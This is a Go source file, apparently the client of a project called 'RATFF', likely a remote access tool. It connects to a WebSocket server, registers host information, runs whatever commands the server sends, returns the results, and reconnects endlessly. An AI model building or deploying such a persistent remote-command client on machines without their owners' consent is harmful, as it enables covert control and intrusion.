package main

import (
	"time"

	"RATFF/shared"

	"github.com/gorilla/websocket"
	"github.com/sirupsen/logrus"
)

var log *logrus.Entry

// runClient establishes a WebSocket connection and runs the message loop.
func runClient(serverURL, clientID string) error {
	conn, _, err := websocket.DefaultDialer.Dial(serverURL, nil)
	if err != nil {
		return err
	}
	defer conn.Close()

	shared.SetupHeartbeat(conn)

	info := shared.BuildClientInfo(clientID)
	msg := shared.NewMessage(shared.MsgRegister, "", clientID, info.ToPayload())
	if err := shared.SendWSMessage(conn, msg); err != nil {
		return err
	}

	log.WithField("client_id", clientID).Info("Connected to server")

	return messageLoop(conn)
}

// messageLoop continuously reads and processes messages from the server.
func messageLoop(conn *websocket.Conn) error {
	for {
		var msg shared.Message
		if err := shared.ReadWSMessage(conn, &msg); err != nil {
			return err
		}

		resp := executeCommand(msg)

		if err := shared.SendWSMessage(conn, resp); err != nil {
			return err
		}
	}
}

func main() {
	log = shared.InitLogger("info", "text")
	loadConfig()

	serverURL := getServerURL()
	clientID := cfg.ClientID
	if clientID == "" {
		clientID = shared.GenerateClientID()
	}
	cfg.ClientID = clientID

	for {
		if err := runClient(serverURL, clientID); err != nil {
			log.Error("Connection lost: ", err)
		}

		log.Info("Reconnecting...")
		time.Sleep(3 * time.Second)
	}
}
